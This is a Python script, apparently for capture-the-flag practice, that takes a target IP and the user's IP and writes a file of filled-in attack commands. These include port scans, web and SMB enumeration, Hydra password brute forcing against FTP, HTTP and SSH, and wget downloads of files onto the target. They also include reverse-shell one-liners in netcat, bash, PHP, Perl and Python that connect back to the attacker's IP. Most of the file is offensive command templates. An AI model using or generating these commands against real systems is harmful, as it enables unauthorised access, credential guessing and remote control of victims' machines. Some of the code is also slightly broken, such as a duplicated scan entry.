"""
-------------
| CTF Ware |
------------
| hlpr |
--------

Version: 1.1
Date: Dec/2021

------------------------------
---------------
Additions Made:
---------------
+ Request for user's IP.
+ API commands
+ Reverse Shell commands.
+ Python Server commands.
------------------------------

"""


from time import sleep
import main



# -- Global Variables
# -- The List of Commands
# -- The UI (user input) IP address
the_commands_list = []
ip = ""



# The Title function
def title():
        print("""
        __  __  
|__||  |__)|__) 
|  ||__|   | \  
---------------------------------------------------------------------
| Give it IPs & HLPR will give you a file of commands for your CTF. |
---------------------------------------------------------------------
""")

        # -- Adding it to the top of the file
        helper_title = """\n>>> >>> >>> >>> >>> >>> >>>
                          \n>>> [ CTF Ware : HLPR ] <<<
                          \n      < exeCODEable > 
                          \n>>> >>> >>> >>> >>> >>> >>>"""
        the_commands_list.append(helper_title)

        sleep(2)

        # -- Calling the User Input function
        # -- This will start the chain reaction
        user_input()




# User Input Function
# Will take in the user's input and call the next function: scanning()
def user_input():
    # -- User Input : The IP address as a string
    ip = str(input("Enter the Target's IP: "))

    # -- User Input : The IP address of the user as a string
    ip2 = str(input("Enter Your IP: "))

    # -- Call the Scanning function
    scanning(ip)

    # -- Call the API function
    api(ip2)



# //////// End of User Function ////////





# Scanning Function
# Will input the IP into the Scanning parameters and call the next function: enum()
def scanning(ip):
    print("\nConfiguring Nmap, Masscan & Kite Runner"
          "\n---------------------------------------")
    sleep(2)

    # -- Title
    scan_title = "\n\n[PORT SCANNING]" \
                 "\n- - - - - - - -"
    # -- append The Command List
    the_commands_list.append(scan_title)

    # -- configure Nmap
    nmap = "NMAP:\n" \
           "nmap -T4 -n -sC -sV -Pn- -p- -vv -oA Nmap-Results.txt %s \n" % (ip)
    # -- append The Command List
    the_commands_list.append(nmap)

    # -- configure masscan
    masscan = "MASSCAN:" \
              "\nmasscan %s -p0-65535 --rate 5000 \n" % (ip)
    # -- append The Command List
    the_commands_list.append(masscan)

    # -- configure Kite Runner Scan
    kite_runner_scan = """KITE RUNNER : API SCAN \
                  \nSmall Wordlist:\nkr scan https://%s -w routes-small.kite 
                  \nLarge Wordlist:\nkr scan https://%s -w routes-large.kite \n""" % (ip, ip)
    # -- append The Command List
    the_commands_list.append(kite_runner_scan)

    # -- configure Kite Runner Fuzz
    kite_runner_fuzz = "KITE RUNNER : API FUZZING" \
                       "\nkr brute https://%s -A=apiroutes-210228 \n" % (ip)
    # -- append The Command List
    the_commands_list.append(kite_runner_fuzz)

    # -- Call the Enum function
    enum(ip)

# //////// End of Scanning Function ////////





# Enum Function
# Will input the IP into the Enum parameters and call the next function: passwords()
def enum(ip):
    print("Configuring Nikto, GoBuster, & Enum4Linux"
          "\n------------------------------------------")
    sleep(2)

    # -- Title
    enum_title = "\n\n[ENUMERATION]" \
                 "\n- - - - - - -"
    # -- append The Command List
    the_commands_list.append(enum_title)

    # -- configure Nikto
    nikto = "NIKTO:\n" \
            "nikto -h %s > Nikto-Results.txt \n" % (ip)
    # -- append The Command List
    the_commands_list.append(nikto)

    # -- configure GoBuster
    gobuster = "GOBUSTER:\n" \
               "gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://%s > Gobuster-Results.txt \n" % (ip)
    # -- append The Command List
    the_commands_list.append(gobuster)

    # -- configure Enum4Linux
    enum4linux = "Enum4Linux:\n" \
                 "enum4linux -a %s \n" % (ip)
    # -- append The Command List
    the_commands_list.append(enum4linux)

    # -- Call the Passwords function
    passwords(ip)

# //////// End of Enum Function ////////




# The Passwords Function
# Will input the IP into the Hydra parameters and call the next function: thefile()
def passwords(ip):
    print("Configuring Hydra"
          "\n-----------------")
    sleep(2)

    #-- Title
    pw_title = "\n\n[PASSWORD BRUTE FORCING]" \
               "\n- - - - - - - - - - - - -"
    # -- append The Command List
    the_commands_list.append(pw_title)

    # -- configure hydra_ftp
    hydra_ftp = "HYDRA FTP:\n" \
                "hydra -f -V -l [USER] -P /usr/share/wordlists/rockyou.txt ftp://%s \n" % (ip)
    # -- append The Command List
    the_commands_list.append(hydra_ftp)

    # -- configure hydra_http
    hydra_http = "HYDRA HTTP-GET:\n" \
                 "hydra -f -V -l [USER] -P /usr/share/wordlists/rockyou.txt http-get://%s \n" % (ip)
    # -- append The Command List
    the_commands_list.append(hydra_http)

    # -- configure hydra_ssh
    hydra_ssh = "HYDRA SSH:\n" \
                "hydra -t 1 -f -V -l [USER] -P /usr/share/wordlists/rockyou.txt %s ssh -e nsr \n" % (ip)
    # -- append The Command List
    the_commands_list.append(hydra_ssh)

    # The API is being called from the User function

# //////// End of Password Function ////////




# The API Function
# Will input the correct IP for scanning and fuzzing APIs.
def api(ip2):
        print("Configuring API Commands"
              "\n-------------------------")
        sleep(2)

        # -- Title
        api_title = "\n\n[API]" \
                    "\n- - -"
        # -- append The Command List
        the_commands_list.append(api_title)

        # -- Kite Runner : API Scan
        kr_scan = "KITE RUNNER : SCAN \n" \
                  "kr scan https://%s/ -w routes-large.kite \n" % (ip2)
        # -- append The Command List
        the_commands_list.append(kr_scan)

        # -- Kite Runner : API Fuzz
        kr_fuzz = "KITE RUNNER : SCAN \n" \
                  "kr scan https://%s/ -w routes-large.kite \n" % (ip2)
        # -- append The Command List
        the_commands_list.append(kr_fuzz)

        # -- Call the Reverse Shell Function
        reverse_shell(ip2)

# //////// End of API Function ////////




# The Reverse Shell Function
# Will input the correct IP into different reverse shell commands.
def reverse_shell(ip2):
    print("Configuring Reverse Shell Commands"
          "\n----------------------------------")
    sleep(2)

    # -- Title
    rshell_title = "\n\n[REVERSE SHELL COMMANDS]" \
                   "\n- - - - - - - - - - - - -"
    # -- append The Command List
    the_commands_list.append(rshell_title)

    # -- Setting up the listener
    the_listener = "On your machine:\n" \
                   "Netcat Listener: nc -lvp 4444\n"
    # -- append The Command List
    the_commands_list.append(the_listener)

    # -- Basic Connection : Linux
    linux_box = "On target machine : Linux\n" \
                "Basic Connection.\n" \
                "nc %s 4444 -e /bin/bash\n" % (ip2)
    # -- append The Command List
    the_commands_list.append(linux_box)

    # -- Basic Connection : Windows
    windows_box = "On target machine : Windows \n" \
                "Basic Connection.\n" \
                "nc.exe %s 4444 -e cmd.exe \n" % (ip2)
    # -- append The Command List
    the_commands_list.append(windows_box)

    # -- BASH Reverse Shell
    bash_rshell = "On target machine: Bash Reverse Shell\n" \
                  "bash -i >& /dev/tcp/%s/4444 0>&1 \n" % (ip2)
    # -- append The Command List
    the_commands_list.append(bash_rshell)

    # -- PHP Reverse Shell
    php_rshell = "On target machine: PHP Reverse Shell\n" \
                  "php -r ‘$sock=fsockopen(“%s”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);’ \n" % (ip2)
    # -- append The Command List
    the_commands_list.append(php_rshell)

    # -- PERL Reverse Shell
    perl_rshell = "On target machine: Perl Reverse Shell\n" \
                  "perl -e ‘use Socket;$i='%s';$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’ \n" % (ip2)
    # -- append The Command List
    the_commands_list.append(perl_rshell)

    # -- PYTHON Reverse Shell
    python_rshell = "On target machine: Python Reverse Shell\n" \
                  "python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“%s”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’ \n" % (ip2)
    # -- append The Command List
    the_commands_list.append(python_rshell)

    # -- Call the Python Server function
    python_server(ip2)

# //////// End of Reverse Shell Function ////////




# The Python HTTP Server Function
# Will input the correct IP for setting up a server and uploading files to target machine.
def python_server(ip2):
    print("Configuring Python HTTP Server Commands"
          "\n---------------------------------------")
    sleep(2)

    # -- Title
    python_title = "\n\n[PYTHON HTTP SERVER]" \
               "\n- - - - - - - - - - -"
    # -- append The Command List
    the_commands_list.append(python_title)


    # -- Note to user
    python_note = "On your machine:\n" \
                "Python 2: python -m SimpleHTTPServer \n" \
                "Python 3: python3 -m http.server\n"
    # -- append The Command List
    the_commands_list.append(python_note)


    # -- To Upload a file TO the target machine.
    file_upload = "On the Target Machine: File Upload\n" \
                    "To upload a file INTO the Target machine:\n" \
                    "wget http://%s:8000/Your-File-Name-Here\n" % (ip2)
    # -- append The Command List
    the_commands_list.append(file_upload)


    # -- To Upload a file TO the target machine.
    directory_upload = "On the Target Machine: Directory Upload\n" \
                  "To upload a directory INTO the Target machine:\n" \
                  "wget -r http://%s:8000/\n" % (ip2)
    # -- append The Command List
    the_commands_list.append(directory_upload)

    # -- Call the File creation Function
    thefile()

# //////// End of Python Server Function ////////






# The File Function
# Will create and append a file with all the information in The Commands List
# It will also call the Again() function
def thefile():
    # - Open & Append the text file
    print("\n--- Appending Your Text File ---")
    with open("CTFware_hlpr.txt","a", encoding="utf-8") as f:
        for x in range(len(the_commands_list)):
            print(the_commands_list[x], file=f)
    # - close the file
    f.close
    sleep(3)
    print("--[ Your HLPR file is ready ]--")

    # -- Call the again()
    again()






# The Again Function : 
# Will ask the user if they have another IP
# If YES it will start the process again
# If NO it will close the program
def again():
    answer = input("\nDo you have another IP? [y/n] : ")
    if (answer.lower() == 'y'):
        separator ="\n\n\n" \
                   "\n# # # # # # # # # # # # #\n"
        the_commands_list.clear() # <-- to Clear the list before adding new things
        the_commands_list.append(separator) # < -- Add a separator at the end of the file
        user_input() # < -- Call this function to start the process again
    else:
        # -- Go the Mini Menu
        main.mini_menu()







# The Main Guard in ALL the files please.
'''------------------
CALLING THE FUNCTIONS
----------------------'''
#-- Using a Main Guard to prevent it from running when Imported.
if __name__ == '__main__':
    title() # The Title HLPR



